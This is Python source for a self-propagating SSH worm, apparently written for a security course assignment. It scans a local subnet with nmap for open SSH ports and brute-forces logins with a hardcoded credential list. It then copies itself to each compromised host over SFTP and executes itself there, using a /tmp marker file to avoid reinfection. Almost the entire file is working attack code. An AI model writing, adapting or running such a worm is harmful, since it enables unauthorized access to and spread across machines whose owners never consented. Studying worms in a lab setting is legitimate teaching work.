import paramiko
import sys
import socket
import nmap
import netinfo
import os
import sys

# The list of credentials to attempt
credList = [
('hello', 'world'),
('hello1', 'world'),
('root', '#Gig#'),
('cpsc', 'cpsc'),
]

# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"

##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################
def isInfectedSystem():
	if (os.path.isfile(INFECTED_MARKER_FILE)):
		return True
	return False
	# os.path.isfile(INFECTED_MARKER_FILE)
	# # Check if the system as infected. One
	# # approach is to check for a file called
	# # infected.txt in directory /tmp (which
	# # you created when you marked the system
	# # as infected). 
	# pass

#################################################################
# Marks the system as infected
#################################################################
def markInfected():
	#createn  file and truncate if necessary, close it after creating
	os.chdir("/tmp")
	open("infected.txt", 'w').close()
	
	# # Mark the system as infected. One way to do
	# # this is to create a file called infected.txt
	# # in directory /tmp/
	# pass	

###############################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# @param IP, - the IP of the attacker to be passed as system argument so that we do not attack.
# to the victim system
###############################################################
def spreadAndExecute(sshClient, IP):
	
	sftpClient = sshClient.open_sftp()
	sftpClient.put("replicator_worm.py", "/tmp/replicator_worm.py")
	sshClient.exec_command("chmod a+x /tmp/replicator_worm.py")
	sshClient.exec_command("python /tmp/replicator_worm.py " + IP + " 2> errors.txt")
	# This function takes as a parameter 
	# an instance of the SSH class which
	# was properly initialized and connected
	# to the victim system. The worm will
	# copy itself to remote system, change
	# its permissions to executable, and
	# execute itself. Please check out the
	# code we used for an in-class exercise.
	# The code which goes into this function
	# is very similar to that code.	
	# pass


############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(host, userName, password, sshClient):
	try:
		sshClient.connect(host, username = userName, password = password)
		return 0
	except socket.gaierror: 
		#print("Could not connect to host")
		return 3
	except socket.error:
		#print("Could not connect to host")
		return 3
	except paramiko.SSHException:
		return 1

	# Tries to connect to host host using
	# the username stored in variable userName
	# and password stored in variable password
	# and instance of SSH class sshClient.
	# If the server is down	or has some other
	# problem, connect() function which you will
	# be using will throw socket.error exception.	     # Otherwise, if the credentials are not
	# correct, it will throw 
	# paramiko.SSHException exception. 
	# Otherwise, it opens a connection
	# to the victim system; sshClient now 
	# represents an SSH connection to the 
	# victim. Most of the code here will
	# be almost identical to what we did
	# during class exercise. Please make
	# sure you return the values as specified
	# in the comments above the function
	# declaration (if you choose to use
	# this skeleton).
	#pass

###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def attackSystem(host):
	
	# The credential list
	global credList
	
	# Create an instance of the SSH client
	ssh = paramiko.SSHClient()

	# Set some parameters to make things easier.
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
	# The results of an attempt
	attemptResults = None
				
	# Go through the credentials
	for (username, password) in credList:
		
		# TODO: here you will need to
		# call the tryCredentials function
		# to try to connect to the
		# remote system using the above 
		# credentials.  If tryCredentials
		# returns 0 then we know we have
		# successfully compromised the
		# victim. In this case we will
		# return a tuple containing an
		# instance of the SSH connection
		# to the remote system. 
		value = tryCredentials(host, username, password, ssh)

		if value == 0:
			attemptResults = (ssh, username, password)
			break
			
	# Could not find working credentials
	return attemptResults	

####################################################
# Returns the IP of the current system
# # @return - The UP address of the current system
####################################################
def getMyIP():
	for interface in netinfo.list_active_devs():
		if not interface.startswith('lo'):
			return netinfo.get_ip(interface)
	# TODO: Change this to retrieve and
	# return the IP of the current system.
	

#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################
def getHostsOnTheSameNetwork():
	
	# TODO: Add code for scanning
	# for hosts on the same network
	# and return the list of discovered
	# IP addresses.	
	# Create an instance of the port scanner class
	portScanner = nmap.PortScanner()
	
	# Scan the network for systems whose
	# port 22 is open (that is, there is possibly
	# SSH running there). 
	portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')
		
	# Scan the network for hoss
	hostInfo = portScanner.all_hosts()	
	
	# The list of hosts that are up.
	liveHosts = []
	
	# Go trough all the hosts returned by nmap
	# and remove all who are not up and running
	for host in hostInfo:
		
		# Is ths host up?
		if portScanner[host].state() == "up":
			liveHosts.append(host)
			
	return liveHosts

networkHosts = getHostsOnTheSameNetwork()
print(getMyIP())
print(networkHosts)

#We can tell if we are an attacker with the system arguments.  If there are no sys arg
#we know that we are the attacker and remove ourself from the list of networkHost and set IP to ourself
if len(sys.argv) == 1:
	IP = getMyIP()
	networkHosts.remove(IP)
#Else if # of arguments is 2, we will remove the attacker's ip (from sys.argument) and the victim's IP
elif len(sys.argv) == 2:
	if isInfectedSystem() == True: 
		sys.exit()
	else:
		markInfected()
		IP = sys.argv[1]
		networkHosts.remove(getMyIP())
		networkHosts.remove(sys.argv[1])

#Prints Found Hosts
print "Found hosts: ", networkHosts


# Go through the network hosts
for host in networkHosts:
	
	# Try to attack this host
	sshInfo =  attackSystem(host)
	
	print sshInfo
	
	
	# Did the attack succeed?
	if sshInfo:
		
		print "Trying to spread"
		
		#The worm will check if the system has been infected by retrieving the infected.txt. 
		#It will give an IOError if the file does not exist, therefore we will sftp.put the worm on their system.
		try:
			remotepath = '/tmp/infected.txt'
			localpath = os.getenv("HOME") + '/infected.txt'
			sftp = sshInfo[0].open_sftp()
			sftp.get(remotepath, localpath)

		except IOError, e:
			print e
			print "Attacking: ", host
			print "This system should be infected"
			spreadAndExecute(sshInfo[0], IP)
			sys.exit()
			
		print "Spreading complete"	
	

